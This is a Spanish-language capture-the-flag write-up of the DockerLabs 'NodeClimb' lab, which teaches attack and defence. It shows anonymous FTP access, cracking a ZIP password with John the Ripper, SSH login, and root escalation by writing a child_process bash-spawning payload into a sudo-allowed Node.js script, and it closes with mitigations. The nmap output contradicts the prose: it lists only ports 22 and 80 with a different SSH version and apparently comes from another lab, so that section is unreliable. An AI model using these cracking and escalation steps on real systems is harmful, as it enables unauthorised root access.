# NodeClimb — DockerLabs Writeup

**Platform:** DockerLabs | **Difficulty:** easy | **Target IP:** 172.17.0.2 | 

## Descripcion 

Laboratorio para practicar el acceso por FTP anónimo, cracking de un ZIP con John y escalada de privilegios abusando de Node.js.

## Attack chain

**Nmap → FTP Anonymous Access → ZIP Password Cracking → zip2john → John the Ripper → SSH Access → Sudo Enumeration → Writable Node.js Script Abuse → Root**

## 1. Analisis y escaneo del objetivo.

Se realiza un escaneo completo de puertos con `nmap`:

```bash

┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/03-medio/hackpenguin]
└─$ nmap -sV -sC -p- 172.17.0.2
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-15 15:34 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa:13:95:24:c7:08:e8:36:51:6d:ab:b2:e5:3e:3b:da (ECDSA)
|_  256 e2:f3:81:1f:7d:d0:ea:ed:e0:c6:38:11:ed:95:3a:38 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: FE:19:46:FC:25:E5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Puntos destacados del escaneo:

• Puerto 21 (FTP): `vsftpd 3.0.3` con login anónimo permitido (`ftp-anon: Anonymous FTP login allowed`).

• Se lista un archivo en el FTP: `secretitopicaron.zip` (242 bytes).

• Puerto 22 (SSH): `OpenSSH 9.2p1` sobre Debian.

## 2. Explotación - Acceso inicial

### 2.1 Descarga del archivo vía FTP anónimo

```bash
                                                                                                                                 
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/nodeClimb]
└─$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:mariano): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40316|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
226 Directory send OK.
ftp> get secretitopicaron.zip
local: secretitopicaron.zip remote: secretitopicaron.zip
229 Entering Extended Passive Mode (|||45067|)
150 Opening BINARY mode data connection for secretitopicaron.zip (242 bytes).
100% |**********************************************************************************|   242        5.91 MiB/s    00:00 ETA
226 Transfer complete.
242 bytes received in 00:00 (612.24 KiB/s)
ftp> exit
221 Goodbye.

```
### 2.2. Intento de extracción

El ZIP contiene un archivo password.txt protegido con contraseña:

```bash

┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/nodeClimb]
└─$ unzip secretitopicaron.zip                                              
Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password: 
 extracting: password.txt

```

### 2.3. Obtención del hash y crackeo

Se extrae el hash del ZIP con `zip2john` para poder atacarlo con `john`:

```bash

┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/nodeClimb]
└─$ zip2john secretitopicaron.zip > hash.txt
ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=52, decmplen=40, crc=59D5D024 ts=4C03 cs=4c03 type=0
Note: It is normal for some outputs to be very large

┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/nodeClimb]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
password1        (secretitopicaron.zip/password.txt)     
1g 0:00:00:00 DONE (2026-11-21 16:37) 33.33g/s 409600p/s 409600c/s 409600C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```
Una vez obtenida la contraseña y extraído el archivo:

```bash

┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/02-faciles/nodeClimb]
└─$ cat password.txt 
mario:laKontraseñAmasmalotaHdelbarrioH

```
Un par de credenciales válidas para el usuario `mario`.

### 2.4. Acceso por SSH

```bash

ssh mario@172.17.0.2

```

## 3. Escalada de privilegios

### 3.1 Enumeración de permisos sudo

```bash

mario@6b1848e7728f:~$ sudo -l
Matching Defaults entries for mario on 6b1848e7728f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 6b1848e7728f:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js

```
El usuario `mario` puede ejecutar `node` sobre `/home/mario/script.js` **como cualquier usuario (root incluido)**, sin contraseña.

### 3.2 Revisión del script

```bash

mario@6b1848e7728f:~$ cat /home/mario/script.js
mario@6b1848e7728f:~$ ls -la /home/mario/script.js
-rw-r--r-- 1 mario mario 0 Jul  5  2024 /home/mario/script.js

```
El archivo está vacío y pertenece al propio usuario `mario` (`-rw-r--r-- 1 mario mario`), por lo que se tiene permiso de escritura sobre él.

### 3.3 Sobreescritura del script

Se reemplaza el contenido del script por código que invoque una bash interactiva usando el módulo `child_process` de Node:


```bash

echo 'require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})' > /home/mario/script.js

```
**Explicación del payload:**

•  `require("child_process")`: importa el módulo nativo de Node para lanzar procesos del sistema.
• `spawn("/bin/bash", ...)`: lanza una nueva bash como proceso hijo. Como el script corre bajo sudo, esa bash hereda privilegios de root.
• `{stdio: [0,1,2]}`: conecta los file descriptors estándar (stdin, stdout, stderr) del proceso hijo a los de la terminal actual, permitiendo interactuar con la shell resultante en vivo (en vez de quedar un proceso "ciego").

### 3.4 Ejecución con privilegios

```bash

mario@6b1848e7728f:~$ ls -la /home/mario/script.js
-rw-r--r-- 1 mario mario 0 Jul  5  2024 /home/mario/script.js
mario@6b1848e7728f:~$ echo 'require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})' > /home/mario/script.js
mario@6b1848e7728f:~$ sudo /usr/bin/node /home/mario/script.js
root@6b1848e7728f:/home/mario# id
uid=0(root) gid=0(root) groups=0(root)
root@6b1848e7728f:/home/mario# whoami
root

```

Shell interactiva como `root` confirmada.


# Conclusión

A partir del escaneo inicial con **Nmap**, se identificaron los servicios SSH y FTP. Mediante el acceso anónimo al servidor FTP, se descargó un archivo ZIP protegido por contraseña. Utilizando `zip2john` y **John the Ripper**, se crackeó el archivo, obteniendo credenciales válidas para acceder por SSH con el usuario `mario`.

Una vez dentro del sistema, la enumeración de permisos **sudo** reveló que el usuario podía ejecutar un script de **Node.js** como root sin contraseña. Aprovechando que el archivo era modificable por el propio usuario, se inyectó código mediante el módulo `child_process` para ejecutar una shell de Bash con privilegios elevados, logrando acceso como `root`.

En conclusión, esta máquina combina el acceso inicial mediante FTP anónimo y cracking de contraseñas con una escalada de privilegios basada en permisos sudo inseguros y la modificación de scripts ejecutados como root.

| Vulnerabilidad / Técnica | Impacto | Mitigación |
|---|---|---|
| **FTP Anonymous Access** | Permite acceder y descargar archivos del servidor sin autenticación. | Deshabilitar el acceso anónimo y restringir los permisos del servicio FTP. |
| **ZIP protegido con contraseña débil** | Permite recuperar el contenido del archivo mediante ataques de diccionario. | Utilizar contraseñas robustas, largas y aleatorias. |
| **Credenciales expuestas** | Permite obtener acceso remoto al sistema mediante SSH. | Evitar almacenar credenciales en archivos accesibles y utilizar gestores de contraseñas seguros. |
| **Script Node.js modificable ejecutado mediante sudo** | Permite ejecutar código arbitrario con privilegios de root. | Restringir los permisos de escritura y evitar ejecutar mediante sudo scripts modificables por usuarios sin privilegios. |
| **Configuración insegura de sudo (NOPASSWD)** | Permite ejecutar el script autorizado como root sin solicitar contraseña. | Aplicar el principio de mínimo privilegio y limitar los comandos permitidos mediante sudo. |

## Recomendaciones generales

- Deshabilitar el acceso anónimo a servicios FTP y restringir la exposición de archivos.
- Utilizar contraseñas robustas para proteger archivos comprimidos y credenciales del sistema.
- Evitar almacenar contraseñas en archivos sin protección.
- Revisar las reglas de `sudoers` y limitar la ejecución de comandos con privilegios elevados.
- Restringir los permisos de escritura sobre scripts ejecutados por usuarios privilegiados.
- Aplicar el principio de mínimo privilegio en todos los servicios y usuarios del sistema.
